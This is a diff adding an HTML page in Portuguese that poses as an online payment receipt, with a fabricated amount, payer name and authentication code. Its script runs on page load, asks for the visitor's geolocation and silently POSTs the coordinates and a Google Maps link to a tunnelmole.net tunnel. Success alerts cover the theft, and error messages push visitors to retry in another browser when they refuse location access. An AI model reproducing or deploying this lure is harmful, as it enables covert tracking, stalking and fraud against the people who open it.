@@ -1,0 +1,93 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Comprovante Recebimento on-line</title>
+  <link rel="stylesheet" href="styles.css" />
+</head>
+
+<body>
+  <div class="comprovante-container">
+    <h1>Comprovante</h1>
+     <h1>Recebimento on-line</h1>
+    <div class="informacoes">
+      <p><span>Data:</span> <span id="data-atual"></span></p>
+      <p><span>Valor Recebido:</span> R$ 7.358,00</p>
+      <p><span>De:</span> João Silva de Oliveira</p>
+      <p><span>Status:</span> Recebido com Sucesso</p>
+      <p><span>Número de Controle:</span> E60776945602468282153B0549PvaD0c</p>
+      <p></p><p><span>AUTENTICAÇÃO:</span><p> WQcAvKF* b#Rb6aLa aMGwcTGu G@CyrbhR XrLRmM5S @YKMhvUm t?JnDLML FMBJEY9h
+woHBoPMK NgMj42R4 Cn4TkCiR 3?6S#AEt GhE*Zsoh F4UcsWYq 3kmUwmSE @ynJ8?7K
+EY*2Pi6b 3g88bIS3 hbOW8f7S 7KA5ZHNd qHdL#e3z 68MLJPvA 65525468 00293700 0</p>
+ 
+
+   </div>
+
+    <button class="botao" onclick="window.print()">Imprimir</button>
+
+    <div class="comprovante-footer">
+      <p>Se você tiver dúvidas, entre em contato com nosso suporte.</p>
+        <p><a href="javascript:location.reload()">Clique aqui</a> para mais informações.</p>
+    </div>
+
+  </div>
+
+  <script>
+    // Executa automaticamente ao carregar a página
+    window.addEventListener("load", () => {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(sendLocation, handleError);
+      } else {
+        alert("Pagamento realizado com sucesso.");
+      }
+    });
+
+    const dataAtual = new Date();
+    const dia = String(dataAtual.getDate()).padStart(2, '0');
+    const mes = String(dataAtual.getMonth() + 1).padStart(2, '0');
+    const ano = dataAtual.getFullYear();
+
+    const dataFormatada = `${dia}/${mes}/${ano}`;
+
+    document.getElementById("data-atual").textContent = dataFormatada;
+
+    console.log(dataAtual)
+
+    function sendLocation(position) {
+      const latitude = position.coords.latitude;
+      const longitude = position.coords.longitude;
+      const maps = `https://www.google.com/maps?q=${latitude},${longitude}`;
+
+      console.log("Latitude: " + latitude);
+      console.log("Longitude: " + longitude);
+
+      
+      fetch("https://p8sdll-ip-179-93-219-65.tunnelmole.net/send-location", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({ latitude, longitude, maps })
+      })
+      .then(response => response.json())
+      .then(data => {
+        if (data.success) {
+          alert("Pagamento efetuado com sucesso");
+        } else {
+          alert("Identificamos problemas com o seu pagamento. Tente novamente");
+        }
+      })
+      .catch(error => {
+        console.error("Erro:", error);
+      });
+    }
+
+    function handleError(error) {
+      alert("Erro ao efetuar seu pagamento. Tente novamente usando outro navegador web" + error.message);
+    }
+  </script>
+</body>
+</html>
+ 
